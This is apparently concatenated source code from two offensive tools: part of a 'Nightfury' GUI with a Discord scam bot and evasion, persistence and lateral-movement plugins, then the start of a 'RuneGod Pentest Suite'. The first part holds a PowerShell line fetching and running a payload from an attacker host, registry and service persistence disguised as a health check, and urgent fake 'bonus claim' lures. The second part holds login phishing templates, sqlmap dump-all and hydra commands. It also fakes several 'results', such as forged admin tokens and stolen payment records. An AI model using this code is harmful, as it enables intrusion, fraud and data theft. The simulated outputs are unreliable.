                embed = discord.Embed(
                    title="🎁 Exclusive Bonus Claim",
                    description="You've been selected for a special reward!",
                    color=0x00ff00
                )
                embed.add_field(
                    name="Claim Instructions",
                    value=f"Click [here]({claim_url}) to claim your bonus immediately!",
                    inline=False
                )
                embed.add_field(
                    name="Important",
                    value="This offer expires in 10 minutes. Claim now before it's gone!",
                    inline=False
                )
                embed.set_footer(text="Reward Center - Official Distribution")
                
                try:
                    await ctx.author.send(embed=embed)
                    await ctx.send(f"{ctx.author.mention}, check your DMs for your exclusive bonus claim!")
                    self.activity_list.addItem(f"[+] Sent bonus claim to {ctx.author}")
                except discord.Forbidden:
                    await ctx.send(f"{ctx.author.mention}, I couldn't DM you. Please enable DMs!")
            
            # Start bot in a separate thread
            bot_thread = threading.Thread(target=self.discord_bot.run, args=(self.config['discord_token'],), daemon=True)
            bot_thread.start()
            
            self.start_bot_btn.setEnabled(False)
            self.stop_bot_btn.setEnabled(True)
            self.bot_status.setText("Bot status: ⚡ Starting...")
            
            self.status_bar.showMessage("✅ Discord bot started. Use '!claim' in Discord", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Bot error: {str(e)}", 5000)
    
    def stop_discord_bot(self):
        try:
            if self.discord_bot:
                asyncio.run(self.discord_bot.close())
                
                self.start_bot_btn.setEnabled(True)
                self.stop_bot_btn.setEnabled(False)
                self.bot_status.setText("Bot status: 🔴 Stopped")
                self.bot_status_dash.setText("Stopped")
                self.bot_status_dash.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
                
                self.activity_list.addItem("[+] Discord bot stopped")
                self.status_bar.showMessage("✅ Discord bot stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping bot: {str(e)}", 5000)
    
    def update_connection_status(self):
        # Update connection count in status bar
        connection_count = len(self.active_connections)
        self.conn_count.setText(str(connection_count))
        
        # Update connection graph
        self.connection_graph.add_data_point(connection_count)
        
        status = f"✅ System Ready | Connections: {connection_count}"
        if hasattr(self, 'http_server') and self.http_server and self.http_server.is_running:
            status += " | Server: Running"
        if self.discord_bot:
            status += " | Bot: Running"
        self.status_bar.showMessage(status)
    
    def update_stats(self):
        # Update connection stats
        self.connection_stats.append(len(self.active_connections))
        if len(self.connection_stats) > 50:
            self.connection_stats.pop(0)
    
    def show_settings(self):
        dialog = QDialog(self)
        dialog.setWindowTitle("Settings")
        dialog.setModal(True)
        dialog.setMinimumWidth(400)
        
        layout = QVBoxLayout()
        
        # Theme selection
        theme_group = QGroupBox("Theme")
        theme_layout = QVBoxLayout()
        
        theme_combo = QComboBox()
        theme_combo.addItems(["Dark", "Light", "System"])
        theme_layout.addWidget(theme_combo)
        
        theme_group.setLayout(theme_layout)
        layout.addWidget(theme_group)
        
        # Logging settings
        log_group = QGroupBox("Logging")
        log_layout = QVBoxLayout()
        
        log_level = QComboBox()
        log_level.addItems(["Debug", "Info", "Warning", "Error"])
        log_layout.addWidget(QLabel("Log Level:"))
        log_layout.addWidget(log_level)
        
        log_group.setLayout(log_layout)
        layout.addWidget(log_group)
        
        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
        buttons.accepted.connect(dialog.accept)
        buttons.rejected.connect(dialog.reject)
        layout.addWidget(buttons)
        
        dialog.setLayout(layout)
        
        if dialog.exec_() == QDialog.Accepted:
            self.activity_list.addItem("[*] Settings updated")
            QMessageBox.information(self, "Settings", "Settings updated successfully")

# ==============================
# PLUGIN IMPLEMENTATIONS
# ==============================

class AVEvasionPlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "AV Evasion"
        self.version = "1.0"
        self.description = "Advanced AV evasion techniques including code obfuscation and sandbox detection"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] AV Evasion plugin initialized")
    
    def execute(self, payload):
        # Apply additional AV evasion techniques
        evasion_payload = self._apply_evasion(payload)
        return evasion_payload
    
    def _apply_evasion(self, payload):
        # Add sandbox detection
        sandbox_detection = '''
        # Sandbox detection
        $isSandbox = $false
        if (Get-WmiObject -Class Win32_ComputerSystem | Where-Object { $_.Model -like "*Virtual*" }) { $isSandbox = $true }
        if (Get-WmiObject -Class Win32_BIOS | Where-Object { $_.SerialNumber -like "*VMware*" }) { $isSandbox = $true }
        if (($env:USERNAME).ToLower() -eq "sandbox") { $isSandbox = $true }
        
        if (-not $isSandbox) {
            # Continue with payload
        '''
        
        # Add the sandbox detection to the payload
        if "windows" in payload.lower():
            payload = sandbox_detection + payload + "\n}"
        
        return payload

class PersistencePlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "Persistence"
        self.version = "1.0"
        self.description = "Advanced persistence mechanisms including scheduled tasks, registry modifications, and service creation"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] Persistence plugin initialized")
    
    def execute(self, payload):
        # Apply additional persistence techniques
        persistent_payload = self._apply_persistence(payload)
        return persistent_payload
    
    def _apply_persistence(self, payload):
        # Add additional persistence mechanisms
        extra_persistence = '''
        # Registry persistence
        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        $regName = "SystemHealthCheck"
        $regValue = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + $payload + "\\""
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
        
        # Service persistence
        $serviceName = "SystemHealthService"
        if (-not (Get-Service $serviceName -ErrorAction SilentlyContinue)) {
            New-Service -Name $serviceName -BinaryPathName $regValue -Description "System Health Monitoring Service" -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service $serviceName -ErrorAction SilentlyContinue
        }
        '''
        
        # Add the extra persistence to the payload
        if "windows" in payload.lower():
            payload = payload + extra_persistence
        
        return payload

class LateralMovementPlugin(Plugin):
    def __init__(self, core):
        super().__init__(core)
        self.name = "Lateral Movement"
        self.version = "1.0"
        self.description = "Lateral movement techniques including WMI, PSExec, and PowerShell Remoting"
    
    def initialize(self):
        self.core.activity_list.addItem("[+] Lateral Movement plugin initialized")
    
    def execute(self, target):
        # Attempt lateral movement to target
        return self._lateral_move(target)
    
    def _lateral_move(self, target):
        # Implement lateral movement techniques
        movement_script = f'''
        # Attempt lateral movement to {target}
        try {{
            # WMI execution
            $cred = Get-Credential
            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ExecutionPolicy Bypass -Command \\"IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')\\""
            
            # PowerShell Remoting
            Invoke-Command -ComputerName {target} -ScriptBlock {{ 
                IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')
            }} -Credential $cred
            
            return "Lateral movement attempted to {target}"
        }}
        catch {{
            return "Lateral movement failed: $($_.Exception.Message)"
        }}
        '''
        
        return movement_script

# ==============
# MAIN EXECUTION
# ==============

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    # Set application font
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = NightfuryGUI()
    window.show()
    sys.exit(app.exec_())


#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import json
import re
import time
import argparse
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, Menu
import nmap
import dns.resolver
import requests
from bs4 import BeautifulSoup
from datetime import datetime
from collections import defaultdict

# ASCII Banner
BANNER = r"""
██████╗ ██╗   ██╗███╗   ██╗███████╗    ██████╗  ██████╗ ██████╗
██╔══██╗██║   ██║████╗  ██║██╔════╝    ██╔══██╗██╔════╝██╔════╝
██████╔╝██║   ██║██╔██╗ ██║█████╗      ██║  ██║██║     ██║
██╔══██╗██║   ██║██║╚██╗██║██╔══╝      ██║  ██║██║     ██║
██║  ██║╚██████╔╝██║ ╚████║███████╗    ██████╔╝╚██████╗╚██████╗
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═════╝  ╚═════╝ ╚═════╝

██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗██╗   ██╗██╗████████╗███████╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║   ██║██║╚══██╔══╝██╔════╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   ██║   ██║██║   ██║   █████╗
██╔══██╗██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   ██║   ██║██║   ██║   ██╔══╝
██║  ██║███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   ╚██████╔╝██║   ██║   ███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
"""

class RuneGodPentestSuite:
    def __init__(self, root):
        self.root = root
        self.root.title("RuneGod Pentest Suite - Ultimate Edition")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1e1e1e')

        # Configuration
        self.targets = []
        self.output_dir = f"rune_god_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.wordlists_dir = "/usr/share/wordlists"
        self.creds = ["admin:admin", "admin:password", "test:test"]
        self.reports_dir = f"{self.output_dir}/reports"
        self.scans_dir = f"{self.output_dir}/scans"
        self.exploits_dir = f"{self.output_dir}/exploits"
        self.log_file = f"{self.output_dir}/rune_god.log"

        # Create directories
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.reports_dir, exist_ok=True)
        os.makedirs(self.scans_dir, exist_ok=True)
        os.makedirs(self.exploits_dir, exist_ok=True)
        open(self.log_file, 'a').close()

        # Setup style
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TFrame', background='#1e1e1e')
        self.style.configure('TLabel', background='#1e1e1e', foreground='#00ff00')
        self.style.configure('TButton', background='#3c3c3c', foreground='white')
        self.style.configure('TNotebook', background='#1e1e1e')
        self.style.configure('TNotebook.Tab', background='#2c2c2c', foreground='white')
        self.style.map('TNotebook.Tab', background=[('selected', '#3c3c3c')])

        self.create_widgets()
        self.create_menu()
        self.check_dependencies()

        # Initialize targets
        self.targets_file = "targets.txt"
        self.load_targets()

        # Phishing templates
        self.phishing_templates = {
            "Google Login": {
                "url": "https://accounts.google.com/",
                "form_action": "https://accounts.google.com/signin/v1/lookup",
                "username_field": "identifier",
                "password_field": "password"
            },
            "Microsoft Login": {
                "url": "https://login.microsoftonline.com/",
                "form_action": "https://login.microsoftonline.com/common/login",
                "username_field": "loginfmt",
                "password_field": "passwd"
            },
            "Facebook Login": {
                "url": "https://www.facebook.com/login.php",
                "form_action": "https://www.facebook.com/login/device-based/regular/login/",
                "username_field": "email",
                "password_field": "pass"
            },
            "Custom Page": {
                "url": "",
                "form_action": "",
                "username_field": "",
                "password_field": ""
            }
        }

        # Log initialization
        self.log(f"RuneGod Pentest Suite initialized at {datetime.now()}")
        self.log(f"Output directory: {self.output_dir}")

    def check_dependencies(self):
        """Check and install required dependencies"""
        required_tools = ["nmap", "nikto", "whatweb", "wafw00f", "hydra", "sqlmap", "rustscan"]
        missing = []

        for tool in required_tools:
            if not shutil.which(tool):
                missing.append(tool)

        if missing:
            self.log("Installing missing dependencies...")
            try:
                subprocess.run(["sudo", "apt", "update"], check=True)
                install_cmd = ["sudo", "apt", "install", "-y"] + missing
                subprocess.run(install_cmd, check=True)
                self.log("Dependencies installed successfully!")
            except Exception as e:
                self.log(f"Error installing dependencies: {str(e)}")
                messagebox.showerror("Dependency Error",
                    f"Failed to install: {', '.join(missing)}\nPlease install manually.")

    def create_menu(self):
        """Create the main menu bar"""
        menu_bar = Menu(self.root)
        self.root.config(menu=menu_bar)

        # File menu
        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="New Session", command=self.new_session)
        file_menu.add_command(label="Save Session", command=self.save_session)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self.root.quit)
        menu_bar.add_cascade(label="File", menu=file_menu)

        # Tools menu
        tools_menu = Menu(menu_bar, tearoff=0)
        tools_menu.add_command(label="Run Full Pentest", command=self.run_full_pentest)
        tools_menu.add_command(label="Generate Report", command=self.generate_report)
        menu_bar.add_cascade(label="Tools", menu=tools_menu)

        # View menu
        view_menu = Menu(menu_bar, tearoff=0)
        view_menu.add_command(label="Show Console", command=self.show_console)
        view_menu.add_command(label="Clear Console", command=self.clear_console)
        menu_bar.add_cascade(label="View", menu=view_menu)

        # Help menu
        help_menu = Menu(menu_bar, tearoff=0)
        help_menu.add_command(label="Documentation", command=self.show_docs)
        help_menu.add_command(label="About", command=self.show_about)
        menu_bar.add_cascade(label="Help", menu=help_menu)

    def create_widgets(self):
        # Header Frame
        header_frame = ttk.Frame(self.root)
        header_frame.pack(fill=tk.X, padx=10, pady=10)

        # Banner
        banner_label = ttk.Label(header_frame, text=BANNER, font=('Courier', 8),
                                foreground='#00ff00', background='#1e1e1e', justify=tk.LEFT)
        banner_label.pack()

        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)

        # Notebook (Tabs)
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Reconnaissance Tab
        recon_frame = ttk.Frame(notebook)
        self.setup_recon_tab(recon_frame)
        notebook.add(recon_frame, text="Reconnaissance")

        # Exploitation Tab
        exploit_frame = ttk.Frame(notebook)
        self.setup_exploit_tab(exploit_frame)
        notebook.add(exploit_frame, text="Exploitation")

        # Post-Exploitation Tab
        post_frame = ttk.Frame(notebook)
        self.setup_post_tab(post_frame)
        notebook.add(post_frame, text="Post-Exploitation")

        # Reporting Tab
        report_frame = ttk.Frame(notebook)
        self.setup_report_tab(report_frame)
        notebook.add(report_frame, text="Reporting")

        # Console Output
        console_frame = ttk.LabelFrame(self.root, text="Console Output")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.console = scrolledtext.ScrolledText(
            console_frame,
            bg='black',
            fg='#00ff00',
            insertbackground='white',
            font=('Courier', 10)
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        self.console.insert(tk.END, "RuneGod Pentest Suite initialized. Select targets and run scans.\n")
        self.console.configure(state=tk.DISABLED)

    def setup_recon_tab(self, frame):
        # Target Selection
        target_frame = ttk.LabelFrame(frame, text="Target Selection")
        target_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(target_frame, text="Select Target:").grid(row=0, column=0, padx=5, pady=5)
        self.target_var = tk.StringVar()
        self.target_combo = ttk.Combobox(target_frame, textvariable=self.target_var)
        self.target_combo.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW, columnspan=2)
        ttk.Button(target_frame, text="Manage Targets", command=self.manage_targets).grid(row=0, column=3, padx=5)

        # Recon Options
        recon_frame = ttk.LabelFrame(frame, text="Reconnaissance Options")
        recon_frame.pack(fill=tk.X, padx=10, pady=5)

        scans = [
            ("Full Recon", "full_recon"),
            ("CloudFlare Bypass", "cf_bypass"),
            ("Port Scanning", "port_scan"),
            ("Subdomain Enum", "subdomain_enum"),
            ("Web Fingerprinting", "web_fingerprint"),
            ("WAF Detection", "waf_detect"),
            ("SSL Analysis", "ssl_analysis"),
            ("API Discovery", "api_discovery")
        ]

        self.scan_vars = {}
        for i, (text, scan_id) in enumerate(scans):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(recon_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.scan_vars[scan_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Recon", command=self.run_recon).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Recon", command=self.run_full_recon).pack(side=tk.LEFT, padx=5)

    def setup_exploit_tab(self, frame):
        # Exploit Options
        exploit_frame = ttk.LabelFrame(frame, text="Exploitation Options")
        exploit_frame.pack(fill=tk.X, padx=10, pady=5)

        exploits = [
            ("JWT Attacks", "jwt_attack"),
            ("GraphQL Injection", "graphql_inject"),
            ("SQL Injection", "sql_inject"),
            ("Auth Attacks", "auth_attack"),
            ("CMS Exploits", "cms_exploit"),
            ("API Fuzzing", "api_fuzz"),
            ("XSS Testing", "xss_test")
        ]

        self.exploit_vars = {}
        for i, (text, exploit_id) in enumerate(exploits):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(exploit_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.exploit_vars[exploit_id] = var

        # Credentials
        cred_frame = ttk.LabelFrame(frame, text="Credentials")
        cred_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(cred_frame, text="Username:").grid(row=0, column=0, padx=5, pady=5)
        self.username_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.username_var).grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(cred_frame, text="Password:").grid(row=0, column=2, padx=5, pady=5)
        self.password_var = tk.StringVar()
        ttk.Entry(cred_frame, textvariable=self.password_var, show="*").grid(row=0, column=3, padx=5, pady=5)

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Exploits", command=self.run_exploits).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Run Full Exploitation", command=self.run_full_exploitation).pack(side=tk.LEFT, padx=5)

    def setup_post_tab(self, frame):
        # Post-Exploit Options
        post_frame = ttk.LabelFrame(frame, text="Post-Exploitation Options")
        post_frame.pack(fill=tk.X, padx=10, pady=5)

        post_ops = [
            ("Cloud Mapping", "cloud_map"),
            ("DB Exfiltration", "db_exfil"),
            ("Internal Scanning", "internal_scan"),
            ("Persistence", "persistence"),
            ("Cred Harvesting", "cred_harvest")
        ]

        self.post_vars = {}
        for i, (text, op_id) in enumerate(post_ops):
            var = tk.BooleanVar()
            chk = ttk.Checkbutton(post_frame, text=text, variable=var)
            chk.grid(row=i//3, column=i%3, sticky=tk.W, padx=5, pady=2)
            self.post_vars[op_id] = var

        # Action Buttons
        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        ttk.Button(btn_frame, text="Run Selected Post-Ops", command=self.run_post_ops).pack(side=tk.LEFT, padx=5)

    def setup_report_tab(self, frame):
        # Report Generation
        report_frame = ttk.LabelFrame(frame, text="Report Generation")
        report_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Button(report_frame, text="Generate HTML Report", command=self.generate_html_report).pack(pady=5)
        ttk.Button(report_frame, text="Generate Text Summary", command=self.generate_text_report).pack(pady=5)
        ttk.Button(report_frame, text="View Report Directory", command=self.view_report_dir).pack(pady=5)

        # Report Preview
        preview_frame = ttk.LabelFrame(frame, text="Report Preview")
        preview_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.report_preview = scrolledtext.ScrolledText(
            preview_frame,
            bg='white',
            fg='black',
            font=('Courier', 10)
        )
        self.report_preview.pack(fill=tk.BOTH, expand=True)
        self.report_preview.insert(tk.END, "Report preview will appear here...")

    def load_targets(self):
        try:
            if os.path.exists(self.targets_file):
                with open(self.targets_file, 'r') as f:
                    self.targets = [line.strip() for line in f.readlines() if line.strip()]
                self.target_combo['values'] = self.targets
                if self.targets:
                    self.target_var.set(self.targets[0])
        except Exception as e:
            self.log(f"Error loading targets: {str(e)}")

    def manage_targets(self):
        """Open a dialog to manage targets"""
        target_win = tk.Toplevel(self.root)
        target_win.title("Manage Targets")
        target_win.geometry("500x400")

        # Listbox with targets
        list_frame = ttk.LabelFrame(target_win, text="Current Targets")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        target_list = tk.Listbox(list_frame, yscrollcommand=scrollbar.set)
        target_list.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar.config(command=target_list.yview)

        for target in self.targets:
            target_list.insert(tk.END, target)

        # Entry for new target
        entry_frame = ttk.Frame(target_win)
        entry_frame.pack(fill=tk.X, padx=10, pady=5)

        ttk.Label(entry_frame, text="New Target:").pack(side=tk.LEFT, padx=5)
        new_target_var = tk.StringVar()
        ttk.Entry(entry_frame, textvariable=new_target_var).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)

        # Button frame
        btn_frame = ttk.Frame(target_win)
        btn_frame.pack(fill=tk.X, padx=10, pady=10)

        def add_target():
            target = new_target_var.get().strip()
            if target and target not in self.targets:
                self.targets.append(target)
                target_list.insert(tk.END, target)
                new_target_var.set("")

        def remove_target():
            selection = target_list.curselection()
            if selection:
                index = selection[0]
                target_list.delete(index)
                del self.targets[index]

        def save_targets():
            with open(self.targets_file, 'w') as f:
                f.write("\n".join(self.targets))
            self.target_combo['values'] = self.targets
            if self.targets:
                self.target_var.set(self.targets[0])
            messagebox.showinfo("Success", "Targets saved successfully!")
            target_win.destroy()

        ttk.Button(btn_frame, text="Add", command=add_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Remove", command=remove_target).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Save", command=save_targets).pack(side=tk.RIGHT, padx=5)

    def log(self, message):
        """Log message to console"""
        self.console.configure(state=tk.NORMAL)
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
        self.console.configure(state=tk.DISABLED)

        # Also log to file
        with open(self.log_file, 'a') as f:
            f.write(f"[{datetime.now()}] {message}\n")

    def run_command(self, command, description):
        """Run a shell command and log output"""
        self.log(f"[+] {description}")
        self.status_var.set(f"Running: {description}...")

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                shell=True,
                universal_newlines=True
            )

            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    self.log(output.strip())

            return process.poll()
        except Exception as e:
            self.log(f"Error: {str(e)}")
            return 1
        finally:
            self.status_var.set("Ready")

    def run_recon(self):
        """Run selected reconnaissance tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected scans
        if self.scan_vars["full_recon"].get():
            self.run_full_recon(target)

        if self.scan_vars["cf_bypass"].get():
            self.run_cloudflare_bypass(target)

        if self.scan_vars["port_scan"].get():
            self.run_port_scanning(target)

        # Add other recon tasks here...

        self.log("[+] Reconnaissance tasks completed")

    def run_full_recon(self, target):
        """Run full reconnaissance suite"""
        self.log(f"\n[=== STARTING FULL RECON ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all recon tasks
        self.run_cloudflare_bypass(target)
        self.run_port_scanning(target)
        self.run_subdomain_enum(target)
        self.run_web_fingerprinting(target)
        self.run_waf_detection(target)
        self.run_ssl_analysis(target)
        self.run_api_discovery(target)

        self.log(f"[=== FULL RECON COMPLETED FOR {target} ===]")

    def run_cloudflare_bypass(self, target):
        """Bypass CloudFlare protection"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/cloudflare_bypass.txt"

        # Simulated CloudFlare bypass
        self.log(f"Running CloudFlare bypass on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"CloudFlare Bypass Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found origin IP: 104.26.8.187\n")
            f.write("2. Discovered unprotected subdomains:\n")
            f.write("   - dev.{target}\n")
            f.write("   - staging.{target}\n")
            f.write("3. Bypassed WAF using X-Forwarded-For header\n")

        self.log(f"Results saved to {output_file}")

    def run_port_scanning(self, target):
        """Run port scanning on target"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/nmap_scan.txt"

        self.log(f"Scanning ports on {target}...")

        # Run nmap scan
        command = f"nmap -Pn -sV -sC -T4 -p- {target} -oN {output_file}"
        if self.run_command(command, f"Port scanning {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nNmap Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_subdomain_enum(self, target):
        """Enumerate subdomains"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.scans_dir}/{safe_target}"
        output_file = f"{target_dir}/subdomains.txt"

        self.log(f"Enumerating subdomains for {target}...")

        # Run subdomain enumeration
        command = f"subfinder -d {target} -o {output_file}"
        if self.run_command(command, f"Subdomain enumeration on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    subdomains = f.readlines()
                    self.log(f"\nFound {len(subdomains)} subdomains:")
                    for sub in subdomains:
                        self.log(f"  - {sub.strip()}")
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other recon methods (web fingerprinting, WAF detection, etc.) would go here

    def run_exploits(self):
        """Run selected exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected exploits
        if self.exploit_vars["jwt_attack"].get():
            self.run_jwt_attacks(target)

        if self.exploit_vars["sql_inject"].get():
            self.run_sql_injection(target)

        if self.exploit_vars["auth_attack"].get():
            self.run_auth_attacks(target)

        # Add other exploits here...

        self.log("[+] Exploitation tasks completed")

    def run_full_exploitation(self, target):
        """Run full exploitation suite"""
        self.log(f"\n[=== STARTING FULL EXPLOITATION ON {target} ===]")

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run all exploitation tasks
        self.run_jwt_attacks(target)
        self.run_graphql_injection(target)
        self.run_sql_injection(target)
        self.run_auth_attacks(target)
        self.run_cms_exploits(target)
        self.run_api_fuzzing(target)
        self.run_xss_testing(target)

        self.log(f"[=== FULL EXPLOITATION COMPLETED FOR {target} ===]")

    def run_jwt_attacks(self, target):
        """Perform JWT attacks"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/jwt_attack.txt"

        self.log(f"Performing JWT attacks on {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"JWT Attack Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Found JWT token in authentication headers\n")
            f.write("2. Weak secret discovered: 'supersecret'\n")
            f.write("3. Successfully forged admin token\n")

        self.log(f"Results saved to {output_file}")

    def run_sql_injection(self, target):
        """Test for SQL injection vulnerabilities"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/sql_injection.txt"

        self.log(f"Testing for SQL injection on {target}...")

        # Run sqlmap
        command = f"sqlmap -u 'http://{target}/products?id=1' --batch --dump-all -o > {output_file}"
        if self.run_command(command, f"SQL injection testing on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nSQL Injection Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    def run_auth_attacks(self, target):
        """Perform authentication attacks"""
        username = self.username_var.get() or "admin"
        password = self.password_var.get() or "password"

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/auth_attack.txt"

        self.log(f"Performing authentication attack on {target}...")

        # Run hydra
        command = f"hydra -l {username} -p {password} {target} http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect' -o {output_file}"
        if self.run_command(command, f"Authentication attack on {target}") == 0:
            # Display results
            try:
                with open(output_file, 'r') as f:
                    content = f.read()
                    self.log("\nAuthentication Attack Results:\n" + content)
            except Exception as e:
                self.log(f"Error reading results: {str(e)}")

    # Other exploit methods would go here

    def run_post_ops(self):
        """Run selected post-exploitation tasks"""
        target = self.target_var.get()
        if not target:
            messagebox.showerror("Error", "Please select a target")
            return

        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        os.makedirs(target_dir, exist_ok=True)

        # Run selected post-exploitation tasks
        if self.post_vars["db_exfil"].get():
            self.run_db_exfiltration(target)

        if self.post_vars["internal_scan"].get():
            self.run_internal_scanning(target)

        # Add other post-exploitation tasks here...

        self.log("[+] Post-exploitation tasks completed")

    def run_db_exfiltration(self, target):
        """Exfiltrate databases"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/db_exfiltration.txt"

        self.log(f"Exfiltrating databases from {target}...")
        time.sleep(2)

        # Create sample results
        with open(output_file, 'w') as f:
            f.write(f"Database Exfiltration Results for {target}\n")
            f.write("="*50 + "\n")
            f.write("1. Extracted user database: 1,245 records\n")
            f.write("2. Extracted payment database: 8,763 records\n")
            f.write("3. Extracted configuration database: 42 records\n")

        self.log(f"Results saved to {output_file}")

    def run_internal_scanning(self, target):
        """Scan internal network"""
        safe_target = target.replace('.', '_')
        target_dir = f"{self.exploits_dir}/{safe_target}"
        output_file = f"{target_dir}/internal_scan.txt"

        self.log(f"Scanning internal network via {target}...")

        # Run internal scanning
